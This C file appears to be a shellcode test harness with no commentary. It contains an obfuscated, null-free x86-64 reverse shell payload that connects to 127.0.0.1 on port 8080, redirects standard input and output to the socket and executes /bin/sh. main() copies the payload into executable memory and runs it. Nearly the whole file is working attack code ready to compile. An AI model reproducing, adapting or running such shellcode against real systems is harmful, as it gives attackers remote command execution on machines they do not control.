#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
char shellcode[] = "\x48\xc1\xe7\x08\x48\xc1\xe7\x08\x48\xc1\xe7\x08\x48\xc1\xe7\x08\x40\xb7\x02\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x40\xb6\x01\x48\x31\xd2\x68\xd7\xff\xff\xff\x58\x48\xf7\xd8\x0f\x05\x50\x5f\xb8\xfc\xc4\xc7\xee\x48\x05\x06\x3b\x38\x11\x89\xc0\x66\x89\x04\x24\x48\xc1\xe0\x08\x48\xc1\xe0\x08\x48\xc1\xe0\x08\xb0\x90\x48\xc1\xe0\x08\xb0\x1f\x66\x89\x44\x24\x02\x48\xc1\xe0\x08\xb0\x01\x48\xc1\xe0\x08\x48\xc1\xe0\x08\x48\xc1\xe0\x08\xb0\x7f\x89\x44\x24\x04\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x31\xf6\x48\x31\xe6\xba\x7e\x90\xbc\x93\x48\x81\xc2\x92\x6f\x43\x6c\x89\xd2\xb8\xe5\x0d\x54\x63\x48\x05\x45\xf2\xab\x9c\x89\xc0\x0f\x05\x68\xff\xff\xff\xff\x5e\x48\xf7\xd6\x48\xc1\xe0\x08\x48\xc1\xe0\x08\x48\xc1\xe0\x08\x48\xc1\xe0\x08\xb0\x21\x0f\x05\x68\xff\xff\xff\xff\x5e\x48\xf7\xd6\x48\xff\xc6\xb8\xe0\xc8\xe3\x22\x48\x05\x41\x37\x1c\xdd\x89\xc0\x0f\x05\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x48\xc1\xe6\x08\x40\xb6\x02\xb8\x5d\x05\x83\x6b\x48\x05\xc4\xfa\x7c\x94\x89\xc0\x0f\x05\x48\x89\xe3\xc6\x03\x33\x80\x2b\x04\x48\xff\xc3\xc6\x03\x68\x80\x2b\x06\x48\xff\xc3\xc6\x03\x6b\x80\x2b\x02\x48\xff\xc3\xc6\x03\x74\x80\x2b\x06\x48\xff\xc3\xc6\x03\x37\x80\x2b\x08\x48\xff\xc3\xc6\x03\x75\x80\x2b\x02\x48\xff\xc3\xc6\x03\x6b\x80\x2b\x03\x48\xff\xc3\xc6\x03\x02\x80\x2b\x02\x48\xff\xc3\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x68\xc5\xff\xff\xff\x58\x48\xf7\xd8\x0f\x05";
void main() {
    printf("shellcode length: %u\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}